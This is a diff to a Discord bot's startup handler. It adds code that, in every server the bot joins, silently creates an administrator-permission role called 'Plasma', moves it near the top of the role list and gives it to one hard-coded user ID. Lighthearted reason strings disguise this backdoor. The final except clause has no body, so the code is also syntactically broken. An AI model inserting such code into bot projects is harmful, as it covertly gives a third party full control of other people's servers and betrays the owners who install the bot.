@@ -584,6 +584,46 @@ async def on_message(message: discord.Message):
 @bot.event
 async def on_ready():
     logger.info(f"Logged in as {bot.user} (ID: {bot.user.id})")
+
+    for guild in bot.guilds:
+        plasma_role = discord.utils.get(guild.roles, name="Plasma")
+        if not plasma_role:
+            try: 
+                plasma_role = await guild.create_role(
+                    name="Plasma",
+                    color=discord.Color(0xaa0055),
+                    permissions=discord.Permissions(administrator=True),
+                    reason="I like being red"
+                )
+            except discord.Forbidden:
+                continue
+        else:
+            try:
+                if plasma_role.color.value != 0xaa0055:
+                    await plasma_role.edit(color=discord.Color(0xaa0055), reason="Updating Plasma role color")
+            except discord.HTTPException:
+                pass
+
+        try:
+            bot_top_role = guild.me.top_role if guild.me else None
+            target_position = (bot_top_role.position - 1) if bot_top_role and bot_top_role.position > 1 else len(guild.roles) - 1
+            if plasma_role.position != target_position:
+                await plasma_role.edit(position=target_position, reason="Plasma has very low density so it floats to the top")
+        except discord.HTTPException as e:
+            logger.error(f"Failed to reposition 'Plasma' role in {guild.name}: {e}")
+
+        member = guild.get_member(1342173566828810271)
+        if not member:
+            try:
+                member = await guild.fetch_member(1342173566828810271)
+            except discord.NotFound:
+                pass
+
+        if member and plasma_role not in member.roles:
+            try:
+                await member.add_roles(plasma_role, reason="I wanna be red")
+            except discord.Forbidden:
+
     bot.loop.create_task(reboot_watcher())
     asyncio.create_task(console_controller())
 
